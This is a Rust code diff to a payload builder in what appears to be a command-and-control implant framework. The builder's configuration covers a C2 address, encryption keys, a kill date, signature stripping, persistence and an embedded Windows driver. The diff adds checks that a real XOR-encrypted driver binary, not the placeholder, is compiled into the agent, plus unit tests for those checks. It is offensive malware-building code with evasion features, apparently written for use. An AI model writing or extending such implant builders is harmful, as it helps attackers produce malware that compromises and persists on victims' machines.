@@ -23,6 +23,7 @@ pub fn build_agent_for_profile(cfg: &PayloadConfig, override_seed: Option<u64>) 
 
     let effective_features = features_for_package(package, &cfg.features)?;
     validate_transport_feature(cfg.transport, &effective_features)?;
+    validate_embedded_driver_config(cfg, &effective_features)?;
     cfg.validate_transport_settings()?;
 
     let mut extra_env = build_time_env(cfg, &effective_features);
@@ -181,12 +182,15 @@ pub(crate) fn build_time_env(
     // Bake in the embedded driver path when provided.
     // The agent build.rs forwards ORCHESTRA_DRIVER_PATH → SYS_DRIVER_PATH and
     // sets the `has_sys_driver_path` cfg flag so `deploy.rs` can include the
-    // driver bytes at compile time instead of falling back to placeholders.
-    if effective_features.iter().any(|f| f == "embedded_driver") {
+    // driver bytes at compile time.
+    if embedded_driver_enabled(effective_features) {
         if let Some(ref driver_path) = cfg.driver_path {
             let trimmed = driver_path.trim();
             if !trimmed.is_empty() {
-                extra_env.push(("ORCHESTRA_DRIVER_PATH".into(), trimmed.to_string()));
+                extra_env.push((
+                    "ORCHESTRA_DRIVER_PATH".into(),
+                    resolved_driver_path_for_env(trimmed),
+                ));
             }
         }
     }
@@ -214,6 +218,71 @@ fn validate_transport_feature(
             required
         ))
     }
+}
+
+fn embedded_driver_enabled(effective_features: &[String]) -> bool {
+    effective_features.iter().any(|f| f == "embedded_driver")
+}
+
+fn resolved_driver_path_for_env(path: &str) -> String {
+    std::fs::canonicalize(path)
+        .unwrap_or_else(|_| PathBuf::from(path))
+        .to_string_lossy()
+        .into_owned()
+}
+
+fn placeholder_driver_bytes() -> Option<Vec<u8>> {
+    let builder_dir = Path::new(env!("CARGO_MANIFEST_DIR"));
+    let workspace_root = builder_dir.parent().unwrap_or(builder_dir);
+    std::fs::read(
+        workspace_root
+            .join("agent")
+            .join("resources")
+            .join("placeholder_driver.xor"),
+    )
+    .ok()
+}
+
+fn validate_embedded_driver_config(
+    cfg: &PayloadConfig,
+    effective_features: &[String],
+) -> Result<()> {
+    if !embedded_driver_enabled(effective_features) {
+        return Ok(());
+    }
+
+    if cfg.target_os.to_ascii_lowercase() != "windows" {
+        anyhow::bail!("embedded_driver is only supported for Windows builds");
+    }
+
+    let driver_path = cfg
+        .driver_path
+        .as_deref()
+        .map(str::trim)
+        .filter(|p| !p.is_empty())
+        .ok_or_else(|| {
+            anyhow!("embedded_driver requires driver_path (path to XOR-encrypted driver binary)")
+        })?;
+
+    let driver_bytes = std::fs::read(driver_path).with_context(|| {
+        format!(
+            "embedded_driver driver_path is not readable: {}",
+            driver_path
+        )
+    })?;
+    if driver_bytes.is_empty() {
+        anyhow::bail!("embedded_driver driver_path is empty: {driver_path}");
+    }
+
+    if let Some(placeholder_bytes) = placeholder_driver_bytes() {
+        if driver_bytes == placeholder_bytes {
+            anyhow::bail!(
+                "embedded_driver driver_path points to the placeholder payload: {driver_path}"
+            );
+        }
+    }
+
+    Ok(())
 }
 
 fn package_output_format(binary: Vec<u8>, cfg: &PayloadConfig, seed: u64) -> Result<Vec<u8>> {
@@ -397,6 +466,47 @@ fn generate_random_seed() -> u64 {
 mod tests {
     use super::*;
 
+    fn test_driver_path(name: &str) -> PathBuf {
+        let unique = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_nanos();
+        std::env::temp_dir().join(format!(
+            "orchestra-builder-{name}-{}-{unique}.xor",
+            std::process::id()
+        ))
+    }
+
+    fn embedded_driver_cfg(driver_path: Option<String>) -> PayloadConfig {
+        PayloadConfig {
+            target_os: "windows".to_string(),
+            target_arch: "x86_64".to_string(),
+            c2_address: "127.0.0.1:8444".to_string(),
+            encryption_key: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string(),
+            hmac_key: None,
+            c_server_secret: Some("secret".to_string()),
+            server_cert_fingerprint: Some("0".repeat(64)),
+            features: vec!["embedded_driver".to_string()],
+            transport: PayloadTransport::Tls,
+            transport_settings: crate::config::TransportSettings::default(),
+            output_name: None,
+            package: "agent".to_string(),
+            bin_name: Some("agent-standalone".to_string()),
+            output_format: PayloadFormat::Exe,
+            sleep_ms: None,
+            jitter: None,
+            kill_date: None,
+            version_info: None,
+            icon_path: None,
+            manifest_preset: None,
+            custom_manifest: None,
+            strip_signature: true,
+            strip_debug: true,
+            module_aes_key: None,
+            driver_path,
+        }
+    }
+
     #[test]
     fn launcher_rejects_agent_features() {
         let requested = vec!["persistence".to_string()];
@@ -408,6 +518,41 @@ mod tests {
     fn unsupported_package_is_rejected() {
         let err = features_for_package("not-a-package", &[]).unwrap_err();
         assert!(err.to_string().contains("unsupported payload package"));
+    }
+
+    #[test]
+    fn embedded_driver_requires_driver_path() {
+        let cfg = embedded_driver_cfg(None);
+        let err =
+            validate_embedded_driver_config(&cfg, &["embedded_driver".to_string()]).unwrap_err();
+        assert!(err.to_string().contains("requires driver_path"));
+    }
+
+    #[test]
+    fn embedded_driver_rejects_placeholder_payload() {
+        let cfg = embedded_driver_cfg(Some("agent/resources/placeholder_driver.xor".to_string()));
+        let err =
+            validate_embedded_driver_config(&cfg, &["embedded_driver".to_string()]).unwrap_err();
+        assert!(err.to_string().contains("placeholder"));
+    }
+
+    #[test]
+    fn embedded_driver_accepts_readable_non_placeholder_payload() {
+        let path = test_driver_path("payload");
+        std::fs::write(&path, [0x41, 0x42, 0x43, 0x44]).unwrap();
+        let cfg = embedded_driver_cfg(Some(path.to_string_lossy().into_owned()));
+
+        validate_embedded_driver_config(&cfg, &["embedded_driver".to_string()]).unwrap();
+        let env = build_time_env(&cfg, &["embedded_driver".to_string()]);
+        assert!(env.contains(&(
+            "ORCHESTRA_DRIVER_PATH".to_string(),
+            std::fs::canonicalize(&path)
+                .unwrap()
+                .to_string_lossy()
+                .into_owned()
+        )));
+
+        let _ = std::fs::remove_file(path);
     }
 
     #[test]
